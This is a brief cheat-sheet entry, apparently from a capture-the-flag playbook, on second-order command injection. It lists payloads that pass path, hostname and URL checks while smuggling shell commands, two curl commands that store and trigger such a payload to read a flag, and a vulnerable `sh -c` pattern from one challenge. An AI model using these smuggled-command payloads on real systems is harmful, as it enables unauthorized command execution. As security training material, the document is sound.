# Second-order injection (stored now, executed later)

**Signs**: one form **stores** a value (config, profile, log dir, hostname, filename, comment) with
validation for its *storage* context ("must be an absolute path", "must be a hostname"); a
**different** action later uses it (Ship, Run, Backup, Monitor, Export, admin review, cron).
Hint "the form only stores it, the shipper is what runs it".

## Exploit
1. Find the store and the consumer.
2. Satisfy the store-time validation **and** carry a payload:
   - "absolute path" → `/tmp/logs; cat /flag/flag`
   - "hostname" → `example.com$(cat /flag/flag)` (if only charset isn't checked)
   - "starts with http" → `http://x;id`
3. Trigger the consumer and read its output (or the place it writes to).
```bash
curl -s -d 'logdir=/tmp/logs; cat /flag/flag' $T/config
curl -s -X POST $T/ship | grep -o 'flag{[^}]*}'
```
One request is never enough — that's the tell.

## Same pattern, other interpreters
Stored XSS (admin views it), stored SQLi (value reused in a later query), stored SSTI (template
saved, rendered later), stored XXE (XML saved, parsed by a job), PHP guestbook `include`d as code
([code-injection](code-injection.md)).

Seen in: `inj11` (LogWarden: `/config` checks "starts with /", `/ship` runs
`sh -c "ls -la <logdir> && tail ..."`).
